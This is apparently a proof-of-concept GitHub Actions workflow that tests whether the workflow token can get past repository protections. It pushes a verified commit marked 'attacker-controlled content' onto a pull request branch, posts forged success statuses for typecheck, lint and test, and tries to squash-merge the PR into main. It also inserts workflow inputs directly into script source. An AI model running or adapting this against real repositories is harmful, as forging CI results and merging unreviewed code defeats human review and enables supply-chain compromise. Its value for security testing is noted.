name: Probe
on:
  workflow_dispatch:
    inputs:
      pr: {required: true, type: string}
      branch: {required: true, type: string}
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@v7
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          script: |
            const pr = Number('${{ inputs.pr }}'), branch = '${{ inputs.branch }}';
            const {owner, repo} = context.repo;
            const Q = `query($o:String!,$r:String!,$n:Int!){repository(owner:$o,name:$r){pullRequest(number:$n){
              reviewDecision mergeable mergeStateStatus headRefOid }}}`;
            const look = async (l) => { const d = await github.graphql(Q,{o:owner,r:repo,n:pr});
              const p=d.repository.pullRequest;
              core.info(`${l} decision=${p.reviewDecision} mergeable=${p.mergeable} state=${p.mergeStateStatus} head=${p.headRefOid}`); return p; };
            await look('BEFORE');
            const br = await github.graphql(`query($o:String!,$r:String!,$b:String!){repository(owner:$o,name:$r){ref(qualifiedName:$b){target{oid}}}}`,{o:owner,r:repo,b:`refs/heads/${branch}`});
            const made = await github.graphql(`mutation($in:CreateCommitOnBranchInput!){createCommitOnBranch(input:$in){commit{oid}}}`,{
              in:{branch:{repositoryNameWithOwner:`${owner}/${repo}`,branchName:branch},
                  expectedHeadOid:br.repository.ref.target.oid,
                  message:{headline:'attacker-controlled content'},
                  fileChanges:{additions:[{path:'PAYLOAD',contents:Buffer.from('owned\n').toString('base64')}]}}});
            const sha = made.createCommitOnBranch.commit.oid;
            const v = await github.rest.repos.getCommit({owner,repo,ref:sha});
            core.info(`CREATED ${sha} verified=${v.data.commit.verification.verified} reason=${v.data.commit.verification.reason}`);
            await look('AFTER-PUSH');
            for (const c of ['typecheck','lint','test']) {
              await github.rest.repos.createCommitStatus({owner,repo,sha,state:'success',context:c,description:'posted by the workflow token'});
            }
            core.info('STATUS posted typecheck lint test');
            await new Promise(r=>setTimeout(r,8000));
            const ready = await look('AFTER-STATUS');
            try {
              const m = await github.rest.pulls.merge({owner,repo,pull_number:pr,merge_method:'squash'});
              core.info(`MERGE merged=${m.data.merged} sha=${m.data.sha}`);
            } catch(e) { core.info(`MERGE failed ${e.status} ${e.message}`); }
            const main = await github.rest.repos.getCommit({owner,repo,ref:'main'});
            core.info(`MAIN now ${main.data.sha} message=${main.data.commit.message.split('\n')[0]}`);
